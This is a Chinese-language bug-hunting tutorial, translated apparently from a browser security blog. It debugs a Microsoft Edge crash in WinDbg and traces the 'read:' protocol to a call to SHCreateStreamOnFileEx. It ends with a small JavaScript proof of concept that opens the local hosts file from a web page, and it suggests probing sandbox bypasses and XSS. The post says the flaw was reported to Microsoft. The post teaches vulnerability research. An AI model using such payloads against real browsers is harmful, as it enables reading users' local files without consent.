    09 af24a320 d9e4b1d9 EdgeContent!BrowserTelemetry::Instance::2::dynamic
    0a af24a3c0 8810053e shlwapi!IUnknown_Exec+0x79
    0b af24a440 880fee33 EdgeContent!CReadingModeController::_NavigateToUrl+0x52
    0c af24a4a0 88074f98 EdgeContent!CReadingModeController::Open+0x1d3
    0d af24a500 b07df508 EdgeContent!BrowserTelemetry::Instance'::2::dynamic
    0e af24a5d0 b0768c47 edgehtml!FireEvent_BeforeNavigate+0x118
看看前两行，都叫做 blah blah `ReportFailure` ，你不觉得 Edge
是因为出现错误了吗才运行到这里的吗？当然！让我们继续运行下去，直到我们找到一个有意义的函数名。下一个叫做 blah `FallFast`，这便有一些
Edge 知道出现错误才会调用它的味道。但是我们想找到使 Edge 出现问题的代码，那么继续读下去吧。
下一个是 blah `_loadRMHTML`。这个对我来说看起来好多了，你难道不也这么认为吗？事实上，他的名字让我觉得它是加载 HTML
的。在崩溃之前断下程序的话，这将会变得有意思多了，所以为什么不在 `_LoadRMHTML` 上面几行设置断点呢？我们检查了 stack-trace，现在我们来看看代码。
我们先从那个断点（函数+偏移）查看反汇编。这很简单，在 WinDbg 中使用 “ub” 命令。
    0:030> ub EdgeContent!CReadingModeViewerEdge::_LoadRMHTML+0x7c
    EdgeContent!CReadingModeViewerEdge::_LoadRMHTML+0x5a:
    8810693a call qword ptr [EdgeContent!_imp_SHCreateStreamOnFileEx (882562a8)]
    88106940 test eax,eax
    88106942 jns EdgeContent!CReadingModeViewerEdge::_LoadRMHTML+0x7d (8810695d)
    88106944 mov rcx,qword ptr [rbp+18h]
    88106948 lea r8,[EdgeContent!`string (88261320)]
    8810694f mov r9d,eax
    88106952 mov edx,1Fh
    88106957 call EdgeContent!wil::details::in1diag3::FailFast_Hr (8806597c)
我们只关注名字，忽略其他东西，好伐？就像我们在[《trying to find a variation for the mimeType
bug》](https://www.brokenbrowser.com/detecting-apps-mimetype-malware/)中一样，我们在此投机取巧，当然如果我们失败了就继续深入。但有时在调试器上的快速查看能够阐明很多事情。
我们知道如果 Edge 到达这个片段的最后一条指令（地址为 88106957，FailFast_Hr），Edge
就会崩溃掉。我们的目标是弄清我们最终运行到的地方，就是说谁把我带到那里的。上面的代码的第一条指令似乎是调用了一个复杂名称的函数，这显然大量体现了我们的东西。
`EdgeContent!_imp_SHCreateStreamOnFileEx`
在 ! 前的第一部分是该指令所在的模块（exe，dll等等...)。这种情况下是 EdgeContent ，我们甚至不关心它的扩展名，它只是一段代码。!
之后有个有趣的函数名叫`_imp_` ，然后 `SHCreateStreamOnFileEx`
似乎是一个“创建文件流”的函数名。你同意吗？事实上，`_imp_`的部分让我想起这可能是从不同的二进制文件加载的导入函数。让我 google
一下这个名字，看看能不能找到有趣的东西。
这太棒了。第一个结果正是我们搜索的准确名称。让我们来点击一下。
好。此函数接收的第一个参数是 “ _A pointer to a null-terminated string that specifies the
file name_ ”（指向以空字符结尾的字符串指针，该字符串指定文件名）
。因垂丝挺！如果这段代码正被执行，那么它应该接收一个指向文件名的指针作为第一个参数。但是我们这么能看到第一个参数呢？很简单，我们在 Win
x64上运行，[调用约定](https://msdn.microsoft.com/en-us/library/ms235286.aspx)/[参数解析](https://msdn.microsoft.com/en-us/library/zthk2dkh.aspx)说，“前四个参数是 RCX, RDX, R8, R9
”（表示整数/指针）。这意味着第一个参数（指向文件名的指针）将被装载入 RCX 寄存器。
有了这些信息，我们可以在 Edge 调用之前设置一个断点，看看 RCX 在那个确定时刻有何值。但是我们重新启动一遍程序吧，因为这时已经有点迟了：Edge
已经崩溃了。请重新按照上面描述的做一遍（杀掉 Edge 进程，打开它，加载页面，找到进程并附加上去）。
这个时候，不要运行（F5）进程，我们先设置一个断点。WinDbg 显示了我们执行 “ub” 命令时的确切偏移量。
    0:030> ub EdgeContent!CReadingModeViewerEdge::_LoadRMHTML+0x7c
    EdgeContent!CReadingModeViewerEdge::_LoadRMHTML+0x5a:
    8810693a ff1568f91400 call qword ptr [EdgeContent!_imp_SHCreateStreamOnFileEx (882562a8)]
    88106940 85c0 test eax,eax
所以断点应该在 `EdgeContent！CReadingModeViewerEdge :: _ LoadRMHTML 0x5a` 处。我们键入 “bp”
和函数名 + 偏移[回车]。然后 “g” 让 Edge 继续运行。
    0:029> bp EdgeContent!CReadingModeViewerEdge::_LoadRMHTML+0x5a
    0:029> g
这很一颗赛艇。在 `SHCreateStreamOnFileEx` 执行之前，我们想要看到 RCX
指向的文件名（或者字符串）。我们运行代码，稍适小憩。好吧，宝宝我感受到它了 =) 断点连至我的童年。让我们运行这段 JavaScript
代码吧，bang！WinDbg 在此中断。
    Breakpoint 0 hit
    EdgeContent!CReadingModeViewerEdge::_LoadRMHTML+0x5a:
    8820693a ff1568f91400 call qword ptr [EdgeContent!_imp_SHCreateStreamOnFileEx (883562a8)]
这太棒了，现在我们可以检查 RCX 指向的内容。为此我们使用 “d” 命令（显示内存）@ 加上寄存器名称，如下所示：
    0:030> d @rcx
    02fac908 71 00 77 00 69 00 65 00-69 00 77 00 71 00 65 00 q.w.i.e.i.w.q.e.
    02fac918 69 00 75 00 3b 00 61 00-73 00 6a 00 64 00 69 00 i.u.;.a.s.j.d.i.
    02fac928 77 00 21 00 40 00 23 00-24 00 25 00 5e 00 26 00 w.!.@.#.$.%.^.&.
    02fac938 2a 00 00 00 00 00 08 00-60 9e f8 02 db 01 00 00 *.......`.......
    02fac948 10 a9 70 02 db 01 00 00-01 00 00 00 00 00 00 00 ..p.............
    02fac958 05 00 00 00 00 00 00 00-00 00 00 00 19 6c 01 00 .............l..
    02fac968 44 14 00 37 62 de 77 46-9d 68 27 f3 e0 92 00 00 D..7b.wF.h'.....
    02fac978 00 00 00 00 00 00 08 00-00 00 00 00 00 00 00 00 ................
这对我的眼睛很不友好，但在第一行的右边，我看到了一些类似于 Unicode 字符串的东西。我们将它显示为Unicode字符吧（du 命令）。
    0:030> du @rcx
    02fac908 "qwieiwqeiu;asjdiw!@#$%^&*"
Nice!字符串将我包围！看看我们刚才运行的 JavaScript 代码。
看来，传给这个函数的参数是==逗号==后面输入的任何内容。有了这点知识加上知道它期望获取一个文件名，我们可以尝试一个在硬盘上的完整的路径。因为 Edge 在
AppContainer 内部运行，我们将尝试一个可访问的文件。例如来自 windows/system32 目录的内容。
    read:,c:\windows\system32\drivers\etc\hosts
我们同时删除逗号之前的垃圾数据，看起来似乎无关紧要（虽然他值得进行进行更多研究）。我们快速分离，重启 Edge，并运行我们的新代码。
    url = "read:,c:\\windows\\system32\\drivers\\etc\\hosts";
    w = window.open(url, "", "width=300,height=300");
如预期所想，在新窗口中加载本地文件并没有崩溃。
#### [ [PoC – Open hosts on MS
Edge](http://unsafe.cracking.com.ar/demos/edgeprotocols/localfile.html) ]
遵循 bug hunter，我将在此停顿，但我相信所有的这些值得进一步的研究，取决于你的兴趣了：
A）枚举所有可加载的协议，并通过查询字符串攻击应用程序
B) 调戏 `microsoft-edge:` 绕过 HTML5 沙盒，弹出窗口拦截器和谁会知道的东西。
C) 继续使用 `read:` 协议。我们找到了一种方法来阻止它崩溃，但记住有一个函数 `SHCreateStreamOnFileEx`
，我们能够影响它的期望值！这值得更多的尝试。此外，我们可以继续对传入参数进行研究，看看是否使用逗号分隔参数等等。如果调试二进制无聊至极，那么你仍然可以尝试对阅读视图进行
XSS。
希望你能找到成吨的漏洞！如果你有问题，请在[@magicmac2000](https://twitter.com/magicmac2000) 上 ping
我。
Have a nice day！
> Reported to MSRC on 2016-10-26
* * *